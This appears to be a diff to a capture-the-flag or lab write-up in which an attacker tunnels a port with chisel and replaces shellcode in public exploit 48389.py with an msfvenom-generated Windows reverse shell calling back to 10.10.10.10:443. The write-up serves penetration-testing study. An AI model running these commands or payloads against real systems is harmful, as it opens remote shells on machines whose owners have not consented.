@@ -65,7 +65,7 @@ Upload chisel to the target with our SMB share and run it in client mode
 `.\chisel.exe client 10.10.10.10:8000 R:8888:localhost:8888`
 
 Using the remote exploit 48389.py, replace the shellcode for calc.exe with a generic windows/shell_reverse_tcp
-generated with msfvenom
+generated with msfvenom and add `import sys` or replace `sys.exc_value` with e
 
 `msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload `
 
